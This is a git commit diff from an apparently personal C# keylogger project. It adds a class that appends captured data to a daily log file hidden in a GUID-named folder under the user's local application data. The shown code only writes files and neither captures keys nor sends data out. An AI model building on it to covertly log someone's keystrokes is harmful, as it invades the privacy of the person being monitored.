8b66cf8cce36722a73c84c229a0dfc24f9614c98
Mark Francis <mrkfrancis8@gmail.com>
2018-11-27 21:26:38 +0000

    Removed Reader project

--- KeyLogger/AppDataLogger.cs
+++ KeyLogger/AppDataLogger.cs
@@ -1,13 +1,41 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using KeyLoggerConfig;
+using System;
+using System.IO;
 
 namespace KeyLogger
 {
-    public class AppDataLogger
+    public class AppDataLogger : IDisposable
     {
-        
+        public AppDataLogger()
+        {
+            string filename = GetFilename();
+            ActiveFileStream = new StreamWriter(filename, true);
+        }
+
+        StreamWriter ActiveFileStream;
+
+        public void Write(string data)
+        {
+            ActiveFileStream.Write(data);
+        }
+
+        private string GetFilename()
+        {
+            string date = DateTime.Today.ToString("dd.MM.yyyy");
+
+            var appDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData, Environment.SpecialFolderOption.Create);
+
+            string logsFolder = Path.Combine(appDataFolder, Config.AppDataSubfolder);
+
+            Directory.CreateDirectory(logsFolder);
+
+            string filename = Config.FilenameTemplate.Replace("{date}", date);
+            return Path.Combine(logsFolder, filename);
+        }
+
+        public void Dispose()
+        {
+            ActiveFileStream?.Dispose();
+        }
     }
 }
---
+++ KeyLoggerConfig/Config.cs
@@ -0,0 +1,8 @@
+﻿namespace KeyLoggerConfig
+{
+    public class Config
+    {
+        public const string AppDataSubfolder = "d7ca2e47-049d-4b32-8e5d-d04c7225c96a";
+        public const string FilenameTemplate = "{date}.log";
+    }
+}
